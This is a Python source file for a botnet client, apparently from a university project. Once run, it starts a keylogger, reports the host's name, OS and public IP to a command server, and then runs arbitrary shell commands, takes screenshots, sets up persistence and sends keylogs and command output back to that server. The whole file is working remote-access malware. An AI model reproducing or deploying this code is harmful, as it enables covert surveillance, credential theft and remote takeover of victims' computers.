import socketio, subprocess, platform, os, socket, threading, datetime
import  keylogger, persistence
from requests import post, get
import pyscreenshot as ImageGrab

info = {}
sio = socketio.Client()
communication = {}
persistenceVariable = False

info['COMMAND'] = 'INFO'
info["hostname"] = socket.gethostname()
info["OS"] = platform.platform()
info["IP"] = ip = get('https://api.ipify.org').text

x = threading.Thread(target=keylogger.startKeylogger)
x.start()

SERVER_ENDPOINT = "http://192.168.100.222:5000/execute_command"

def execute_command(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_str = output.decode('utf-8') if output else ""
        error_str = error.decode('utf-8') if error else ""

        if error_str:
            result = f"Error: {error_str}"
        else:
            result = f"Output: {output_str}"

    except Exception as e:
        result = f"Error: {str(e)}"

    send_result_to_server(result)

def send_result_to_server(result):
    try:
        data = {
            "result": result,
        }

        response = post(SERVER_ENDPOINT, json=data)

        if response.status_code == 200:
            print("Result sent to server successfully")
        else:
            print(f"Failed to send result to server. Status code: {response.status_code}")

    except Exception as e:
        print(f"Error sending result to server: {str(e)}")

@sio.event
def connect():
    info['sid'] = sio.sid
    sio.send(info)
    print('connection established')

@sio.event
def message(data):
    idNum = data['idNum']
    data = data['newTask']

    global communication
    communication['COMMAND'] = 'OUTPUT'
    communication['hostname'] = info['hostname']
    communication['commandSent'] = data
    communication['idNum'] = idNum

    try:
        global persistenceVariable
        if len(data) > 0:
            if 'persistence' in data:
                if not persistenceVariable:
                    if persistence.tryPersistence():
                        persistenceVariable = True
                        communication['PV'] = persistenceVariable
                        communication['DATA'] = 'Result: Success'
                        sio.send(communication)
                else:
                    communication['PV'] = persistenceVariable
                    communication['DATA'] = 'Result: Failure'
                    sio.send(communication)

            if 'screenshot' in data:
                try:
                    filename = f"screenshot_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
                    im = ImageGrab.grab()
                    im.save(os.path.join(r'D:\Air University\Botnet Project\static\receivedData\screenshots', filename))
                    with open(os.path.join(r'D:\Air University\Botnet Project\static\receivedData\screenshots', filename), 'rb') as f:
                        communication['DATA'] = f.read()
                        sio.send(communication)
                except Exception as e:
                    print('Error taking Screenshot' + str(e))
                    communication['DATA'] = 'Error taking Screenshot'
                    sio.send(communication)

            if 'keylogger' in data:
                try:
                    filename = f"keylogs_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
                    with open(os.path.join(r'D:\Air University\Botnet Project\static\receivedData\keylogs', filename), 'r') as f:
                        keylogger_data = f.read()
                        communication['DATA'] = keylogger_data
                        sio.send(communication)
                except Exception as e:
                    print(str(e))
                    communication['DATA'] = 'Error getting keylog Data.'
                    sio.send(communication)

            if 'cmd' in data:
                data = data.replace('cmd ', '')
                execute_command(data)

    except Exception as e:
        print("Error: " + str(e))

@sio.event
def disconnect():
    print('disconnected from server')
    sio.send({'COMMAND': 'OUTPUT', 'idNum': info['idNum'], 'commandSent': 'status update', 'DATA': 'Bot is dead'})

sio.connect('http://192.168.100.222:5000')
sio.wait()
